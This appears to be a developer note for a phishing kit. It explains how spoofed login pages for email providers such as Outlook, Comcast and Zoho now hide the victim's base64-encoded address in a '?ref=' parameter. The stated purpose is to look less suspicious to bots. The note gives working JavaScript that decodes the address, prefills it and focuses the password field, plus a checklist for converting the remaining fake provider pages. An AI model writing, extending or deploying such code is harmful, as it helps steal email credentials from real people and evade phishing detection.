# Email URL Format Update - Natural-Looking Format

## Overview

The email parameter format has been updated to look more natural and less suspicious to bots. Instead of using `#email=...`, we now use `?ref=...` which looks like a normal referral/tracking parameter.

## New Format

**Before (obvious):**
- `https://frontend.com/#email=dXNlcj5AZXhhbXBsZS5jb20=`
- `https://frontend.com/#email=user@example.com`

**After (natural-looking):**
- `https://frontend.com/?ref=dXNlcj5AZXhhbXBsZS5jb20=`
- `https://frontend.com/?ref=user@example.com`

The `ref` parameter looks like a referral/tracking ID, making it less suspicious to bots.

## Implementation Details

### 1. New Shared Helper (`js/email_extractor.js`)
- Created `extractEmailFromUrl()` function
- Checks query parameter `?ref=` first (preferred)
- Falls back to fragment `#email=` or `#=value` (backward compatibility)
- Handles base64 decoding automatically

### 2. Updated Files

**Core Files:**
- ✅ `js/email_extractor.js` - New shared helper
- ✅ `js/email_provider_detector.js` - Updated to use new format
- ✅ `index.php` - Updated to use `?ref=` in iframe URLs
- ✅ `github/index.html` - Updated to preserve `?ref=` parameter

**Provider Pages (Updated):**
- ✅ `providers/outlook.php`
- ✅ `providers/messaging.php`
- ✅ `providers/Bell.php`

**Provider Pages (Need Update):**
- ⚠️ `providers/access.php`
- ⚠️ `providers/comcast.php`
- ⚠️ `providers/btinternet.php`
- ⚠️ `providers/eastlink.php`
- ⚠️ `providers/frontier.php`
- ⚠️ `providers/Earthlink.php`
- ⚠️ `providers/zoho.php`
- ⚠️ `providers/mymts.php`
- ⚠️ `providers/telia.php`
- ⚠️ `providers/shaw.php`
- ⚠️ `providers/Rackspace.php`
- ⚠️ `providers/webmail.php`
- ⚠️ `providers/bigpond.php`

## Update Pattern for Remaining Provider Pages

For each provider page, make these changes:

### Step 1: Add Script Include
Find the centralized functions section and add:
```html
<script src="../js/email_extractor.js"></script>
```

### Step 2: Update autoFillFromHash() Function
Replace the existing `autoFillFromHash()` function with:

```javascript
function autoFillFromHash() {
    try {
        var email = null;
        if (typeof extractEmailFromUrl === 'function') {
            email = extractEmailFromUrl();
        } else {
            // Fallback if extractor not loaded
            var urlParams = new URLSearchParams(window.location.search);
            var value = urlParams.get('ref');
            if (!value) {
                var h = window.location.hash || '';
                if (h) {
                    var fragment = h.substr(1);
                    if (fragment) {
                        var partsIdx = fragment.indexOf('=');
                        if (partsIdx !== -1) {
                            value = fragment.substr(partsIdx + 1);
                        } else {
                            value = fragment;
                        }
                    }
                }
            }
            if (value) {
                try {
                    value = decodeURIComponent(value);
                    var base64regex = /^([A-Za-z0-9+/]{4})*(([A-Za-z0-9+/]{2}==)|([A-Za-z0-9+/]{3}=))?$/;
                    if (base64regex.test(value.replace(/\s/g, ''))) {
                        try { value = atob(value); } catch (e) {}
                    }
                    if (isValidEmail(value)) email = value;
                } catch (e) {}
            }
        }

        // Fill the email field (adjust selector as needed for each provider)
        if (email && isValidEmail(email)) {
            $('#email').val(email).trigger('input'); // Adjust selector
            $('#password').focus(); // Adjust selector
        }
    } catch (err) { console.warn('autoFillFromHash error', err); }
}
```

**Note:** Adjust the jQuery selectors (`$('#email')`, `$('#password')`) to match each provider's form field IDs.

## Benefits

1. **Less Suspicious**: `?ref=...` looks like a normal referral/tracking parameter
2. **No "email" Keyword**: Removes the obvious "email" keyword from URL
3. **Base64 Encoded**: Email is base64 encoded, making it look like a tracking ID
4. **Backward Compatible**: Still supports old `#email=` format for compatibility
5. **Works with Token Generation**: The github/index.html preserves the `?ref=` parameter through token generation

## Testing

Test with these URL formats:
1. `?ref=dXNlcj5AZXhhbXBsZS5jb20=` (base64 encoded)
2. `?ref=user@example.com` (plain text)
3. `#email=user@example.com` (legacy - should still work)
4. `#=dXNlcj5AZXhhbXBsZS5jb20=` (legacy fragment format)

All formats should extract and auto-fill the email correctly.

